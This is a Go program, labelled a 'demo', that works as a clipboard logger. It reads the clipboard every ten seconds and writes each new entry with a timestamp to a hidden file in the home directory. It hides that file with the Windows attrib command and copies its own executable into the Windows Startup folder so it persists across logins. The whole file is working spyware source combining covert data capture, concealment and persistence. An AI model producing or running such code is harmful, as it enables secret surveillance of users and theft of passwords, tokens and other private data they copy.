package main

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"

	//"syscall"

	"github.com/atotto/clipboard"
)

func main() {
	fmt.Println("Captured Clipboard Demo")

	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	// Determine hidden file path in user's home directory
	homeDir, err := os.UserHomeDir()
	check(err)

	hiddenFile := filepath.Join(homeDir, ".clipboard_capture")

	// Set up persistence at boot-time (windows)
	err = setupPersistence()
	check(err)

	// Create the .clipboard_capture file
	f, err := os.OpenFile(hiddenFile, os.O_CREATE|os.O_WRONLY, 0600)
	check(err)
	f.Close()

	// Hide the .clipboard_capture file on Windows
	if runtime.GOOS == "windows" {
		err := hideFile(hiddenFile)
		check(err)
	}
	
	// Start reading clipboard
	readClipboard(ticker, hiddenFile)
}

func readClipboard(ticker *time.Ticker, hiddenFile string) {
	var last string

	for {
		txt, err := clipboard.ReadAll()
		check(err)

		if txt != last {
			fmt.Printf("[%s]: %q\n", time.Now().Format(time.RFC3339), summarize(txt))
			last = txt
			if last != "" {
				storeClipboard(hiddenFile, last)
			}
		}
		<-ticker.C //wait for next tick
	}
}

func storeClipboard(path, data string) {
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	check(err)

	defer f.Close()
	timestamp := time.Now().Format(time.RFC3339)
	entry := fmt.Sprintf("[%s]: %s\n", timestamp, data)
	_, err = f.WriteString(entry)
	check(err)
}

// Copy the binary to the Windows Startup folder for autorun at login
func setupPersistence() error {
	appData := os.Getenv("APPDATA")
	if appData == "" {
		return fmt.Errorf("APPDATA environment variable not found")
	}
	startupDir := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	if _, err := os.Stat(startupDir); os.IsNotExist(err) {
		err = os.MkdirAll(startupDir, 0755)
		if err != nil {
			return err
		}
	}

	binaryPath, err := os.Executable()
	if err != nil {
		return err
	}
	binaryName := filepath.Base(binaryPath)
	targetPath := filepath.Join(startupDir, binaryName)

	// Copy binary if not already present
	if _, err := os.Stat(targetPath); os.IsNotExist(err) {
		in, err := os.Open(binaryPath)
		check(err)
		defer in.Close()

		out, err := os.OpenFile(targetPath, os.O_CREATE|os.O_WRONLY, 0755)
		check(err)
		defer out.Close()

		_, err = io.Copy(out, in)
		check(err)
	}
	return nil
}

// hideFile sets the hidden attribute on a file in Windows
func hideFile(path string) error {
	cmd := exec.Command("attrib", "+H", path)
	return cmd.Run()
}

func check(err error) {
	if err != nil {
		panic(err)
	}
}

func summarize(s string) string {
	// Keep output readable: show up to 300 chars
	if len(s) > 300 {
		return s[:300] + "...(truncated)"
	}
	return s
}

// // hideFile sets the hidden attribute on a file in Windows (used if build from Windows)
// func hideFile(path string) error{
// 	if runtime.GOOS != "windows" {
// 		path, err := syscall.UTF16PtrFromString(path)
// 		err = syscall.SetFileAttributes(path, syscall.FILE_ATTRIBUTE_HIDDEN)
// 		check(err)
// 	}
// 	return nil
// }

